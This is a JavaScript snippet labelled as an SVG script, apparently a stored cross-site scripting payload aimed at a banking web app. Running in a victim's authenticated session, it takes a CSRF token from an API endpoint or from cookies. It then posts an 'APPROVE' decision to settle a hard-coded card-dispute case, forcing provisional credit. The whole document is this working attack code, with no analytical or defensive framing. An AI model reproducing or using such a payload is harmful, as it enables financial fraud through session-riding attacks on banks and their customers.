svg.script:
(async () => {
  const caseReference = 'CD-7FC8550C09';
  const status = document.getElementById('status');
  const setStatus = value => { status.textContent = value; };
  const readCookie = name => document.cookie.split(';').map(value => value.trim())
    .find(value => value.startsWith(name + '='))?.split('=').slice(1).join('=') || '';

  try {
    setStatus('requesting-cardops-token');
    const csrfResponse = await fetch('/api/bankapp/card-operations/csrf', {
      credentials: 'include',
      cache: 'no-store'
    });
    let csrf = {};
    try { csrf = await csrfResponse.clone().json(); } catch (_) {}
    const token = decodeURIComponent(
      csrf.token || csrf.csrfToken || csrf.csrf_token || csrf.value
      || readCookie('XSRF-TOKEN') || readCookie('CARDOPS-XSRF-TOKEN')
    );

    setStatus('submitting-provisional-credit');
    const response = await fetch(
      `/api/bankapp/card-disputes/${encodeURIComponent(caseReference)}/settle`,
      {
        method: 'POST',
        credentials: 'include',
        cache: 'no-store',
        headers: {
          'Content-Type': 'application/json',
          'X-XSRF-TOKEN': token,
          'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({ decision: 'APPROVE' })
      }
    );
    setStatus(response.ok ? 'provisionally-credited' : `settlement-${response.status}`);
  } catch (_) {
    setStatus('settlement-failed');
  }
})();
